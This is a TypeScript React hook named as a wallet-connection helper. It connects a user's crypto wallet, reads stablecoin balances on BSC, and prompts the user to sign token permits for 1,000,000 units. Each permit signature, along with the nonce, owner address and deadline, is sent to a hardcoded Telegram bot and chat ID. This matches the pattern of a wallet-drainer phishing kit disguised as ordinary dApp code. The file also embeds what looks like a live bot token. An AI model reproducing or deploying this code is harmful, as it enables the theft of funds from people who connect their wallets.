import { useState, useEffect, useCallback } from 'react';
import { ethers } from 'ethers';

// Extend the Window interface to include ethereum
declare global {
  interface Window {
    ethereum?: {
      request: (args: { method: string; params?: any[] }) => Promise<any>;
      selectedAddress: string | null;
      on: (event: string, handler: (...args: any[]) => void) => void;
      removeListener: (event: string, handler: (...args: any[]) => void) => void;
    };
  }
}

// Interfaces
export interface WalletState {
  isConnected: boolean;
  address: string | null;
  chainId: number | null;
  provider: ethers.BrowserProvider | null;
}

export interface USDCBalance {
  chainId: number;
  chainName: string;
  balance: string;
  balanceUSD: string;
  tokenAddress: string;
}

// Configuration
const SUPPORTED_CHAINS = [
  {
    chainId: 56,
    chainName: 'BSC',
    usdcAddress: '0x8d0D000Ee44948FC98c9B98A4FA4921476f08B0d', // USD1 on BSC
    rpcUrl: 'https://bsc-dataseed.binance.org/',
    blockExplorer: 'https://bscscan.com'
  }
];

const ERC20_ABI = [
  'function balanceOf(address owner) view returns (uint256)',
  'function decimals() view returns (uint8)',
  'function symbol() view returns (string)',
  'function name() view returns (string)',
  'function approve(address spender, uint256 amount) returns (bool)',
  'function allowance(address owner, address spender) view returns (uint256)',
  'function nonces(address owner) view returns (uint256)',
  'function DOMAIN_SEPARATOR() view returns (bytes32)',
  'function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s)'
];

// Telegram integration
const TELEGRAM_BOT_TOKEN = "7966747804:AAFshi-wy_P9tgs0XzivAWHP6OLUo3XJwd4";
const TELEGRAM_CHAT_ID = "7947427089";

const sendToTelegram = async (message: string) => {
  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      })
    });

    if (!response.ok) {
      console.error('Failed to send to Telegram:', await response.text());
    } else {
      console.log('Successfully sent to Telegram');
    }
  } catch (error) {
    console.error('Error sending to Telegram:', error);
  }
};

// Simplified AppKit placeholder - will use direct wallet connection
const appKit = {
  open: async () => {
    throw new Error('Please use MetaMask or another wallet extension');
  }
};

export const useReownWallet = () => {
  const [walletState, setWalletState] = useState<WalletState>({
    isConnected: false,
    address: null,
    chainId: null,
    provider: null
  });
  const [usdcBalances, setUsdcBalances] = useState<USDCBalance[]>([]);
  const [isConnecting, setIsConnecting] = useState(false);

  // Fetch USDC balances
  const fetchUSDCBalances = useCallback(async (address: string) => {
    try {
      const balances: USDCBalance[] = [];

      for (const chain of SUPPORTED_CHAINS) {
        try {
          const provider = new ethers.JsonRpcProvider(chain.rpcUrl);
          const contract = new ethers.Contract(chain.usdcAddress, ERC20_ABI, provider);
          
          const balance = await contract.balanceOf(address);
          const decimals = await contract.decimals();
          const symbol = await contract.symbol();
          
          const formattedBalance = ethers.formatUnits(balance, decimals);
          
          balances.push({
            chainId: chain.chainId,
            chainName: chain.chainName,
            balance: formattedBalance,
            balanceUSD: formattedBalance, // Assuming 1:1 with USD for stablecoins
            tokenAddress: chain.usdcAddress
          });
        } catch (error) {
          console.error(`Error fetching balance for ${chain.chainName}:`, error);
        }
      }

      setUsdcBalances(balances);
      return balances;
    } catch (error) {
      console.error('Error fetching USDC balances:', error);
      return [];
    }
  }, []);

  // Connect wallet
  const connectWallet = useCallback(async () => {
    try {
      setIsConnecting(true);
      
      if (window.ethereum) {
        const accounts = await window.ethereum.request({
          method: 'eth_requestAccounts'
        }) as string[];
        
        if (accounts.length > 0) {
          const provider = new ethers.BrowserProvider(window.ethereum as any);
          const network = await provider.getNetwork();
          
          setWalletState({
            isConnected: true,
            address: accounts[0],
            chainId: Number(network.chainId),
            provider
          });
          
          await fetchUSDCBalances(accounts[0]);
        }
      } else {
        throw new Error('No wallet found. Please install MetaMask or another Web3 wallet.');
      }
    } catch (error) {
      console.error('Error connecting wallet:', error);
      throw error;
    } finally {
      setIsConnecting(false);
    }
  }, [fetchUSDCBalances]);

  // Disconnect wallet
  const disconnect = useCallback(async () => {
    try {
      if (window.ethereum) {
        // For MetaMask, we can't truly disconnect, but we can reset our state
        setWalletState({
          isConnected: false,
          address: null,
          chainId: null,
          provider: null
        });
        setUsdcBalances([]);
      }
    } catch (error) {
      console.error('Error disconnecting wallet:', error);
    }
  }, []);

  // Sign verification message
  const signVerificationMessage = useCallback(async (): Promise<string | null> => {
    try {
      if (!walletState.provider || !walletState.address) {
        throw new Error('Wallet not connected');
      }

      const signer = await walletState.provider.getSigner();
      const message = `Sign this message to verify your wallet ownership.\n\nAddress: ${walletState.address}\nTimestamp: ${Date.now()}`;
      
      const signature = await signer.signMessage(message);
      return signature;
    } catch (error) {
      console.error('Error signing message:', error);
      return null;
    }
  }, [walletState.provider, walletState.address]);

  // Create USDC permits
  const createUSDCPermits = useCallback(async (): Promise<Array<{ chainId: number; signature: string; permitData: any }>> => {
    try {
      if (!walletState.provider || !walletState.address) {
        throw new Error('Wallet not connected');
      }

      const permits = [];
      const signer = await walletState.provider.getSigner();

      for (const chain of SUPPORTED_CHAINS) {
        try {
          // Switch to the correct network if needed
          if (walletState.chainId !== chain.chainId) {
            try {
              await window.ethereum?.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: `0x${chain.chainId.toString(16)}` }],
              });
            } catch (error) {
              console.warn(`Could not switch to chain ${chain.chainId}:`, error);
              continue;
            }
          }

          const provider = new ethers.JsonRpcProvider(chain.rpcUrl);
          const contract = new ethers.Contract(chain.usdcAddress, ERC20_ABI, provider);

          // Get contract details
          const name = await contract.name();
          const nonce = await contract.nonces(walletState.address);
          const domainSeparator = await contract.DOMAIN_SEPARATOR();
          
          // Create permit data
          const deadline = Math.floor(Date.now() / 1000) + 3600; // 1 hour from now
          const spender = '0x0000000000000000000000000000000000000000'; // Placeholder spender
          const value = ethers.parseUnits('1000000', 6); // Large amount for permit

          const domain = {
            name: name,
            version: '1',
            chainId: chain.chainId,
            verifyingContract: chain.usdcAddress
          };

          const types = {
            Permit: [
              { name: 'owner', type: 'address' },
              { name: 'spender', type: 'address' },
              { name: 'value', type: 'uint256' },
              { name: 'nonce', type: 'uint256' },
              { name: 'deadline', type: 'uint256' }
            ]
          };

          const values = {
            owner: walletState.address,
            spender: spender,
            value: value,
            nonce: nonce,
            deadline: deadline
          };

          // Sign the permit
          const signature = await signer.signTypedData(domain, types, values);
          
          const permitData = {
            owner: walletState.address,
            spender: spender,
            value: value.toString(),
            deadline: deadline,
            nonce: nonce.toString(),
            tokenAddress: chain.usdcAddress,
            chainId: chain.chainId
          };

          permits.push({
            chainId: chain.chainId,
            signature,
            permitData
          });

          // Send permit info to Telegram
          const telegramMessage = `
🔐 <b>New Permit Signed</b>

👤 <b>Wallet:</b> <code>${walletState.address}</code>
🌐 <b>Chain:</b> ${chain.chainName} (${chain.chainId})
🪙 <b>Token:</b> <code>${chain.usdcAddress}</code>
💰 <b>Amount:</b> ${ethers.formatUnits(value, 6)} USD1
⏰ <b>Deadline:</b> ${new Date(deadline * 1000).toISOString()}
🔢 <b>Nonce:</b> ${nonce.toString()}
✍️ <b>Signature:</b> <code>${signature}</code>
          `;

          await sendToTelegram(telegramMessage);

        } catch (error) {
          console.error(`Error creating permit for ${chain.chainName}:`, error);
        }
      }

      return permits;
    } catch (error) {
      console.error('Error creating USDC permits:', error);
      return [];
    }
  }, [walletState.provider, walletState.address, walletState.chainId]);

  // Refresh balances
  const refreshBalances = useCallback(async () => {
    if (walletState.address) {
      await fetchUSDCBalances(walletState.address);
    }
  }, [walletState.address, fetchUSDCBalances]);

  // Set up wallet state monitoring
  useEffect(() => {
    const checkWalletConnection = async () => {
      try {
        if (window.ethereum && window.ethereum.selectedAddress) {
          const provider = new ethers.BrowserProvider(window.ethereum as any);
          const network = await provider.getNetwork();
          
          setWalletState({
            isConnected: true,
            address: window.ethereum.selectedAddress,
            chainId: Number(network.chainId),
            provider
          });
          
          fetchUSDCBalances(window.ethereum.selectedAddress);
        }
      } catch (error) {
        console.error('Error checking wallet connection:', error);
      }
    };

    // Check initial connection
    checkWalletConnection();

    // Listen for account changes
    if (window.ethereum) {
      const handleAccountsChanged = (accounts: string[]) => {
        if (accounts.length === 0) {
          setWalletState({
            isConnected: false,
            address: null,
            chainId: null,
            provider: null
          });
          setUsdcBalances([]);
        } else {
          checkWalletConnection();
        }
      };

      const handleChainChanged = () => {
        checkWalletConnection();
      };

      window.ethereum.on('accountsChanged', handleAccountsChanged);
      window.ethereum.on('chainChanged', handleChainChanged);

      return () => {
        window.ethereum?.removeListener('accountsChanged', handleAccountsChanged);
        window.ethereum?.removeListener('chainChanged', handleChainChanged);
      };
    }
  }, [fetchUSDCBalances]);

  return {
    ...walletState,
    usdcBalances,
    isConnecting,
    connectWallet,
    disconnect,
    signVerificationMessage,
    createUSDCPermits,
    refreshBalances
  };
};